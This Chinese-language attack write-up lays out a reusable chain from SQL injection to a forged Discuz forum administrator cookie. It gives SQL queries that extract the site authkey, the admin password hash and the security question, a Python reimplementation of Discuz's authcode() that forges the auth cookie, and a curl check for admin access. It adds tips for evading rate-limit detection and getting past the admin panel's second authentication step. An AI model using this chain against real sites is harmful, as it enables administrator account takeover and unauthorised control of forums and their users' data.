# 一、从 SQL 注入到 Discuz 管理员 cookie（完整链路，可复用）

## 1. 前提：拿到三要素
通过任意 SQL 注入读库（本例为 UNION 注入 + 第3列回显）取得：
- `authkey`：`SELECT value FROM <DISCUZ_DB>.cdb_settings WHERE variable='authkey'`   → 例：5da91fHyeY5hBOCM
- `password`：`SELECT password FROM <DISCUZ_DB>.cdb_members WHERE uid=1`            → 例：76a30864d6f129d07bddc47ba8ea8207
- `secques`：  `SELECT secques  FROM <DISCUZ_DB>.cdb_members WHERE uid=1`            → 常为空串

## 2. 关键算法（Discuz 源码 include/common.inc.php）
```php
$discuz_auth_key = md5($_DCACHE['settings']['authkey'] . $_SERVER['HTTP_USER_AGENT']);
list($discuz_pw, $discuz_secques, $discuz_uid) = explode("\t", authcode($_DCOOKIE['auth'], 'DECODE'));
// 随后：WHERE m.uid='$discuz_uid' AND m.password='$discuz_pw' AND m.secques='$discuz_secques'
```
⇒ cookie 明文 = `password \t secques \t uid`；key = `md5(authkey + UA)`；**UA 必须与请求完全一致**。

## 3. authcode() Python 复刻（ENCODE）
```python
import base64, hashlib, time
def md5(s):
    if isinstance(s, str): s = s.encode('utf-8','ignore')
    return hashlib.md5(s).hexdigest()

def authcode_encode(string, key, expiry=0):
    ck = 4
    key = md5(key)
    keya, keyb = md5(key[:16]), md5(key[16:32])
    keyc = md5(str(time.time()))[-ck:]
    cryptkey = keya + md5(keya + keyc)
    klen = len(cryptkey)
    s = ("%010d" % (expiry + int(time.time()) if expiry else 0)) + md5(string + keyb)[:16] + string
    box = list(range(256)); rnd = [ord(cryptkey[i % klen]) for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + box[i] + rnd[i]) % 256
        box[i], box[j] = box[j], box[i]
    out, a, j = [], 0, 0
    for ch in s.encode('utf-8','ignore'):
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        box[a], box[j] = box[j], box[a]
        out.append(ch ^ box[(box[a] + box[j]) % 256])
    return keyc + base64.b64encode(bytes(out)).decode().replace('=', '')

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.26 Safari/537.36"
auth = authcode_encode("76a30864d6f129d07bddc47ba8ea8207\t\t1", md5("5da91fHyeY5hBOCM" + UA))
print("Cookie: %s_auth=%s" % (cookiepre, auth))
```

## 4. cookie 前缀必须先实测
默认常见 `cdb_`，本例实为 **`mNc_`**：`GET /` 观察 `Set-Cookie: mNc_sid=...` ⇒ 对应 cookie 名为 `mNc_auth`。

## 5. 验证
```bash
curl -s -H "User-Agent: <与生成一致的UA>" -H "Cookie: mNc_auth=<auth>" http://<forum>/example.com
```
成功判据（对照实验）：页面出现 `個人中心 / 管理中心 / 退出` 与 `<a href="example.com">管理中心</a>`（Discuz 仅对管理员渲染），
且**移除 cookie 后这些元素消失**。

## 6. 坑与限制
- UA 不一致 ⇒ 解码失败（静默回落为游客）
- `secques` 必须与库中值逐字节相同（空值即 `pwd\t\t1`）
- 请求量累积可能触发平台风控，会话降级为游客；建议单线程 ≥2s/请求，首次验证后立即保存响应原文
- 后台 `example.com` 另有二次认证（AdminSession / `$cpaccess`）：
  `if(empty($session)) { $cpaccess = 1; }` ⇒ 无 session 记录时可直接进入；
  若 `!$discuz_secques && $admincp['forcesecques']` 则强制要求安全提问，可能停在登录页